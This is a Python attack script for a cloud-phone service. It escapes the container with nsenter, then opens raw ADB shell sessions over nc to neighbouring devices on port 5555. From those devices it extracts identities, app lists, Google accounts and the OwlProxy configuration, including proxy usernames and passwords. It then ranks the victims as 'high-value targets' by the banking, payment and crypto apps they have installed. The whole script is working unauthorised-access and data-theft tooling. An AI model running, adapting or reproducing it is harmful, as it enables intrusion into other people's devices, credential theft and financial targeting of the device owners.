#!/usr/bin/env python3
"""
Phase 2: Extract detailed data from discovered ADB neighbors.
Reads scan_results.txt (pre-populated by background scan) and extracts:
- Device identity, proxy configs, app lists, VPN configs, accounts
"""
import asyncio
import json
import sys
import os
import base64
import struct
import time
import re

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from vmos_titan.core.vmos_cloud_api import VMOSCloudClient

AK = "YOUR_VMOS_AK_HERE"
SK = "YOUR_VMOS_SK_HERE"
BASE = "https://api.vmoscloud.com"
PAD = "ATP6416I3JJRXL3V"
DELAY = 3.5


async def sh(c, cmd, t=30):
    await asyncio.sleep(DELAY)
    try:
        r = await c.sync_cmd(pad_code=PAD, command=cmd, timeout_sec=t)
        d = r.get("data", {})
        if isinstance(d, list) and d:
            e = d[0]
            return (e.get("errorMsg", "") or "").strip() if isinstance(e, dict) else str(e)
        elif isinstance(d, dict):
            return (d.get("errorMsg", "") or "").strip()
        return str(d)
    except Exception as e:
        return f"ERR:{e}"


async def nsh(c, cmd, t=30):
    e = cmd.replace("'", "'\\''")
    return await sh(c, f"nsenter -t 1 -m -u -i -n -p -- sh -c '{e}'", t)


def adb_pkt(cmd_id, arg0, arg1, data=b""):
    return struct.pack("<IIIIII", cmd_id, arg0, arg1, len(data),
                       sum(data) & 0xFFFFFFFF, cmd_id ^ 0xFFFFFFFF) + data


async def adb_exec(c, ip, shell_cmd, timeout=4):
    """Execute shell on ADB neighbor."""
    CNXN = 0x4E584E43
    OPEN = 0x4E45504F
    cnxn = adb_pkt(CNXN, 0x01000001, 0x00040000, b"host::\x00")
    opn = adb_pkt(OPEN, 1, 0, f"shell:{shell_cmd}\x00".encode())
    cb = base64.b64encode(cnxn).decode()
    ob = base64.b64encode(opn).decode()
    
    result = await nsh(c,
        f"echo {cb} | base64 -d > /data/local/tmp/cn.bin && "
        f"echo {ob} | base64 -d > /data/local/tmp/op.bin && "
        f"{{ cat /data/local/tmp/cn.bin; sleep 0.2; cat /data/local/tmp/op.bin; sleep {timeout}; }} | "
        f"nc -w {timeout+1} {ip} 5555 > /data/local/tmp/ar 2>/dev/null; "
        f"strings /data/local/tmp/ar | "
        f"grep -vE '^(host::|device::|shell,|CNXN|OPEN|WRTE|OKAY|CLSE|features=)' | head -80",
        t=timeout + 15)
    return result


async def main():
    c = VMOSCloudClient(ak=AK, sk=SK, base_url=BASE)
    
    print("=" * 70)
    print("  PHASE 2: DATA EXTRACTION FROM DISCOVERED NEIGHBORS")
    print("=" * 70)
    
    # Step 1: Read pre-scanned results
    print("\n[1] Reading scan results from device...")
    raw = await nsh(c, "cat /data/local/tmp/scan_results.txt 2>/dev/null")
    
    # Parse hosts and their models from scan results
    hosts = {}
    if raw:
        for line in raw.split("\n"):
            if line.startswith("ADB:"):
                parts = line.split(":", 2)
                if len(parts) >= 2:
                    ip = parts[1]
                    banner = parts[2] if len(parts) > 2 else ""
                    model = "?"
                    if "ro.product.model=" in banner:
                        try:
                            model = banner.split("ro.product.model=")[1].split(";")[0]
                        except:
                            pass
                    hosts[ip] = {"banner": banner, "model": model}
    
    # Deduplicate
    hosts.pop("10.10.53.148", None)  # Remove ourselves
    
    print(f"  Found {len(hosts)} unique ADB hosts")
    
    # Show a sample
    for ip in sorted(hosts.keys())[:20]:
        print(f"    {ip:<18} {hosts[ip]['model']}")
    if len(hosts) > 20:
        print(f"    ... and {len(hosts) - 20} more")
    
    # Get the second page of results too (642 lines might be truncated)
    print("\n[1b] Checking for more results...")
    raw2 = await nsh(c, "wc -l /data/local/tmp/scan_results.txt; grep -c '^ADB:' /data/local/tmp/scan_results.txt; grep 'SUBNET_DONE' /data/local/tmp/scan_results.txt; grep 'SCAN_COMPLETE' /data/local/tmp/scan_results.txt")
    print(f"  Stats: {raw2}")

    # Read additional pages if scan results are large
    raw_p2 = await nsh(c, "tail -200 /data/local/tmp/scan_results.txt 2>/dev/null")
    if raw_p2:
        for line in raw_p2.split("\n"):
            if line.startswith("ADB:"):
                parts = line.split(":", 2)
                if len(parts) >= 2:
                    ip = parts[1]
                    banner = parts[2] if len(parts) > 2 else ""
                    model = "?"
                    if "ro.product.model=" in banner:
                        try:
                            model = banner.split("ro.product.model=")[1].split(";")[0]
                        except:
                            pass
                    if ip not in hosts:
                        hosts[ip] = {"banner": banner, "model": model}
    
    hosts.pop("10.10.53.148", None)
    print(f"  Updated total: {len(hosts)} unique hosts")
    
    # Step 2: Extract data from each host (limit to first 50 for speed)
    target_ips = sorted(hosts.keys())[:50]
    print(f"\n[2] Extracting data from {len(target_ips)} neighbors...")
    
    for i, ip in enumerate(target_ips):
        model = hosts[ip]["model"]
        print(f"\n  [{i+1}/{len(target_ips)}] {ip} ({model})")
        
        # A) Full identity
        ident = await adb_exec(c, ip,
            "getprop ro.product.model; getprop ro.product.brand; "
            "getprop ro.build.fingerprint; getprop ro.serialno; "
            "getprop ro.build.version.release; getprop ro.build.version.sdk",
            3)
        hosts[ip]["identity"] = ident
        if ident:
            lines = [l.strip() for l in ident.split("\n") if l.strip()][:3]
            for l in lines:
                print(f"    id: {l}")
        
        # B) 3rd party packages
        apps = await adb_exec(c, ip, "pm list packages -3 2>/dev/null", 6)
        app_list = [l.replace("package:", "").strip() for l in (apps or "").split("\n") if "package:" in l]
        hosts[ip]["app_list"] = app_list
        hosts[ip]["apps_raw"] = apps
        print(f"    apps: {len(app_list)} packages")
        
        # C) Proxy / HTTP proxy / network
        proxy_data = await adb_exec(c, ip,
            "settings get global http_proxy 2>/dev/null; "
            "getprop persist.sys.http_proxy; "
            "ip route show default 2>/dev/null; "
            "iptables -t nat -L OUTPUT -n 2>/dev/null | grep -i redirect | head -3",
            4)
        hosts[ip]["proxy_raw"] = proxy_data
        
        # Try to detect proxy
        proxy = None
        if proxy_data:
            for line in proxy_data.split("\n"):
                l = line.strip()
                if l and l != "null" and l != ":" and ":" in l:
                    if re.match(r'[\d.]+:\d+', l):
                        proxy = l
                        break
        hosts[ip]["proxy"] = proxy
        print(f"    proxy: {proxy or 'none'}")
        if proxy_data:
            for l in proxy_data.strip().split("\n")[:4]:
                if l.strip() and l.strip() != "null":
                    print(f"    net: {l.strip()}")
        
        # D) VPN / Proxy apps
        vpn = await adb_exec(c, ip,
            "ls /data/data/com.owlproxy.overseas/ 2>/dev/null && echo OWLPROXY_EXISTS; "
            "ls /data/data/io.nekohasekai.sagernet/ 2>/dev/null && echo SAGERNET_EXISTS; "
            "dumpsys connectivity 2>/dev/null | grep -i 'vpn\\|proxy' | head -5",
            4)
        hosts[ip]["vpn_raw"] = vpn
        if vpn and ("OWLPROXY_EXISTS" in vpn or "SAGERNET_EXISTS" in vpn or "vpn" in vpn.lower()):
            print(f"    vpn: {vpn[:150]}")
        
        # E) Extract OwlProxy config if exists
        if vpn and "OWLPROXY_EXISTS" in vpn:
            owl_cfg = await adb_exec(c, ip,
                "cat /data/data/com.owlproxy.overseas/shared_prefs/*.xml 2>/dev/null | head -40",
                5)
            hosts[ip]["owlproxy_config"] = owl_cfg
            if owl_cfg:
                print(f"    owlproxy: {owl_cfg[:200]}")
        
        # F) Google accounts
        accts = await adb_exec(c, ip,
            "dumpsys account 2>/dev/null | grep 'Account {' | head -10",
            4)
        hosts[ip]["accounts"] = accts
        acct_count = (accts or "").count("Account {")
        print(f"    accounts: {acct_count}")
    
    # Step 3: Score and rank
    HIGH_VALUE = {
        "com.google.android.apps.walletnfcrel": ("Google Pay", 15),
        "com.paypal.android.p2pmobile": ("PayPal", 12),
        "com.venmo": ("Venmo", 10),
        "com.squareup.cash": ("Cash App", 12),
        "com.chime.chmob": ("Chime", 10),
        "com.transferwise.android": ("Wise", 10),
        "com.revolut.revolut": ("Revolut", 10),
        "com.coinbase.android": ("Coinbase", 10),
        "com.binance.dev": ("Binance", 10),
        "com.bybit.app": ("Bybit", 8),
        "com.robinhood.android": ("Robinhood", 10),
        "com.zellepay.zelle": ("Zelle", 10),
        "com.wf.wellsfargomobile": ("Wells Fargo", 12),
        "com.chase.sig.android": ("Chase", 12),
        "com.bankofamerica.cashpromobile": ("BofA", 12),
        "com.citi.citimobile": ("Citi", 10),
        "com.usaa.mobile.android.usaa": ("USAA", 10),
        "com.capitalone.mobile": ("Capital One", 10),
        "com.samsung.android.spay": ("Samsung Pay", 12),
        "com.amazon.mShop.android.shopping": ("Amazon", 8),
        "com.affirm.customer": ("Affirm", 8),
        "com.klarna.android": ("Klarna", 8),
        "com.stripe.android.dashboard": ("Stripe", 8),
    }
    
    ranked = []
    for ip, info in hosts.items():
        score = 0
        hv_apps = []
        for pkg, (name, pts) in HIGH_VALUE.items():
            if pkg in info.get("app_list", []):
                hv_apps.append(name)
                score += pts
        if info.get("proxy"):
            score += 20
        if info.get("vpn_raw") and ("OWLPROXY" in (info.get("vpn_raw") or "") or "SAGERNET" in (info.get("vpn_raw") or "")):
            score += 15
        acct_count = (info.get("accounts") or "").count("Account {")
        score += acct_count * 3
        
        ranked.append({
            "ip": ip,
            "model": info.get("model", "?"),
            "score": score,
            "hv_apps": hv_apps,
            "app_count": len(info.get("app_list", [])),
            "proxy": info.get("proxy"),
            "has_vpn": bool(info.get("vpn_raw") and ("OWLPROXY" in info.get("vpn_raw","") or "SAGERNET" in info.get("vpn_raw",""))),
            "acct_count": acct_count,
        })
    
    ranked.sort(key=lambda x: x["score"], reverse=True)
    
    # Print final report
    print(f"\n\n{'='*80}")
    print(f"  NEIGHBOR RECON REPORT — {len(hosts)} TOTAL DEVICES")
    print(f"{'='*80}")
    
    print(f"\n  {'Rank':<5} {'IP':<18} {'Model':<18} {'Score':<7} {'Apps':<6} {'Proxy':<8} {'VPN':<5} {'High-Value Apps'}")
    print(f"  {'─'*90}")
    for i, t in enumerate(ranked[:50], 1):
        hv = ", ".join(t["hv_apps"][:3]) or "-"
        px = t["proxy"] or "no"
        vpn = "YES" if t["has_vpn"] else "no"
        print(f"  {i:<5} {t['ip']:<18} {t['model'][:17]:<18} {t['score']:<7} {t['app_count']:<6} {px[:7]:<8} {vpn:<5} {hv}")
    
    # Proxy endpoints
    proxies = [t for t in ranked if t["proxy"]]
    print(f"\n  PROXY ENDPOINTS ({len(proxies)}):")
    print(f"  {'─'*60}")
    for p in proxies:
        # Try to extract proxy details
        det = hosts[p["ip"]].get("owlproxy_config", "")
        print(f"    {p['ip']:<18} {p['model']:<18} proxy={p['proxy']}")
        if det:
            # Extract server/port/user/pass from XML
            for tag in ["server", "port", "username", "password", "protocol", "location", "expire"]:
                match = re.search(rf'<(?:string|int) name="{tag}"[^>]*>([^<]+)', det)
                if match:
                    print(f"      {tag}: {match.group(1)}")
    
    # VPN endpoints
    vpn_hosts = [t for t in ranked if t["has_vpn"]]
    print(f"\n  VPN/PROXY APP HOSTS ({len(vpn_hosts)}):")
    for v in vpn_hosts:
        vpn_raw = hosts[v["ip"]].get("vpn_raw", "")
        owlcfg = hosts[v["ip"]].get("owlproxy_config", "")
        print(f"    {v['ip']:<18} {v['model']:<18}")
        if owlcfg:
            print(f"      Config: {owlcfg[:200]}")
    
    # BY SUBNET breakdown
    print(f"\n  SUBNET BREAKDOWN:")
    subnet_counts = {}
    for ip in hosts:
        subnet = ".".join(ip.split(".")[:3])
        subnet_counts[subnet] = subnet_counts.get(subnet, 0) + 1
    for sn in sorted(subnet_counts.keys()):
        print(f"    {sn}.0/24: {subnet_counts[sn]} devices")
    
    # Save report
    report = {
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "platform": PAD,
        "total_hosts": len(hosts),
        "extracted_data_count": len(target_ips),
        "rankings": ranked[:50],
        "proxy_endpoints": [{"ip": p["ip"], "model": p["model"], "proxy": p["proxy"]} for p in proxies],
        "vpn_hosts": [v["ip"] for v in vpn_hosts],
        "subnet_breakdown": subnet_counts,
        "all_devices": {
            ip: {
                "model": info.get("model", "?"),
                "identity": (info.get("identity") or "")[:300],
                "apps": info.get("app_list", []),
                "proxy": info.get("proxy"),
                "proxy_raw": (info.get("proxy_raw") or "")[:200],
                "vpn": (info.get("vpn_raw") or "")[:200],
                "owlproxy": (info.get("owlproxy_config") or "")[:300],
                "accounts": (info.get("accounts") or "")[:200],
            }
            for ip, info in hosts.items()
        }
    }
    
    with open("neighbor_recon_report.json", "w") as f:
        json.dump(report, f, indent=2, default=str)
    
    print(f"\n  Report saved: neighbor_recon_report.json")
    print(f"\n  SUMMARY:")
    print(f"    Total ADB neighbors discovered: {len(hosts)}")
    print(f"    Detailed extraction completed:  {len(target_ips)}")
    print(f"    Proxy endpoints found:          {len(proxies)}")
    print(f"    VPN/proxy app hosts:            {len(vpn_hosts)}")
    print(f"    High-value targets (score>10):  {len([r for r in ranked if r['score'] > 10])}")
    print(f"    Financial apps total:           {sum(len(r['hv_apps']) for r in ranked)}")


if __name__ == "__main__":
    asyncio.run(main())
